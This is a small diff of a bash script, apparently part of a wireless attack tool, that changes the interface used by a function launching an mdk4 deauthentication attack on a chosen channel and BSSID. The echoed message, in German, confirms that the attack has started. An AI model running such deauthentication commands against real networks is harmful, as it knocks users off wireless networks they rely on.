@@ -17,7 +17,7 @@ function perform_deauth {
     local channel=$1
     local bssid=$2
 
-    screen -dmS deauth mdk4 wlan0 d -c "$channel" -B "$bssid"
+    screen -dmS deauth mdk4 wlan1 d -c "$channel" -B "$bssid"
 
     echo "Deauthentication-Angriff gestartet für BSSID '$bssid'."
 
